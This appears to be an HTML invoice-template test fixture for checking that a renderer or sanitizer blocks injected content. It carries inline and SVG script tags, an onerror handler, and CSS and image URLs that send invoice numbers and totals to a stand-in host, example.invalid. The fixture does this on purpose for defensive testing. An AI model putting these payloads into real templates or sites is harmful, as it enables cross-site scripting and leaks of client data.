<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="https://example.invalid/evil.css">
  <style>
    @import url("https://example.invalid/imported.css");
    .body-box {
      background-image: url("https://example.invalid/css_leak?total={{totals.total}}");
      color: #333333;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="body-box">
    <h1>Security Audit Invoice {{invoiceNumber}}</h1>
    <p>Client: {{recipient.name}}</p>
    
    <!-- HTML Script Injection -->
    <script>window.__INJECTED_XSS = true;</script>
    
    <!-- External HTTP/HTTPS Image with token reflection & inline handler -->
    <img src="https://example.invalid/collect?invoice={{invoiceNumber}}" alt="External Leak" onerror="window.__INJECTED_XSS = true;" />
    
    <!-- Protocol-relative image -->
    <img src="//example.invalid/collect_proto?invoice={{invoiceNumber}}" alt="Proto Leak" />
    
    <!-- SVG script & SVG image href -->
    <svg width="100" height="100">
      <script>window.__INJECTED_XSS = true;</script>
      <image href="https://example.invalid/svg_leak?inv={{invoiceNumber}}" />
      <use href="https://example.invalid/svg_use#sym" />
    </svg>

    <!-- Legitimate safe inline raster base64 image -->
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY44YAAAAASUVORK5CYII=" alt="Safe Base64" />

    <div>Grand Total: {{totals.total}}</div>
  </div>
</body>
</html>
